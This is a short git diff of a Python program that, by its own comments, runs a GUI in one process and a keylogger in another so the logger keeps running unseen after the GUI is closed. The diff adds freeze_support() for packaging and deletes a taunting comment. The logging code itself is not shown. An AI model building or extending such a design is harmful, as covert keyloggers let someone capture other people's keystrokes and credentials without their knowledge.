@@ -12,10 +12,10 @@ def process1():
 def process2():
     gui.startgui()
 
-#but you are not safe
 #by having multiple processes the user should be able to close the gui
 #and have the keylogger continue to run unseen
 if __name__=="__main__":
+    multiprocessing.freeze_support()
     p1= multiprocessing.Process(target=process1)
     p2= multiprocessing.Process(target=process2)
 
